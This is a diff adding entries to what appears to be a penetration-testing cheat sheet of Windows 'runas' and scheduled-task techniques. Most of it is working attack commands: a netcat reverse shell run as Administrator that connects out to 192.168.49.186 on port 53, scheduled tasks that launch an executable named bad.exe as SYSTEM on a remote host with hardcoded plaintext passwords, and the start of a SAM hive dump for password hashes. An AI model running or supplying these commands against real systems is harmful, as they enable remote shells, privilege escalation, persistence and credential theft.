@@ -1,3 +1,35 @@
+### Runas Powershell
+https://stackoverflow.com/questions/28989750/running-powershell-as-another-user-and-launching-a-script
+```
+$username = 'user'
+$password = 'password'
+
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+Start-Process Notepad.exe -Credential $credential
+```
+
+### Runas cmd
+```
+runas /user:Administrator "c:\test\nc.exe 192.168.49.186 53 -e cmd.exe" < password.txt
+```
+
+### Runas with Scheduled Task in Powershell
+```
+$pw = ConvertTo-SecureString '+9B1w$XVK!qR1c' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)
+
+Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\test\bad.exe /ru SYSTEM } -Credential $creds
+
+Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds
+```
+
+### Runas with Scheduled Task in cmd
+```
+schtasks /create /sc MINUTE /tn shell /tr C:\test\bad.exe /ru Administrator /rp #8E)[,m63d8juk
+schtasks /run /tn shell
+```
+
 ### Dump hashes
 ````
 reg save hklm\sam .\sam
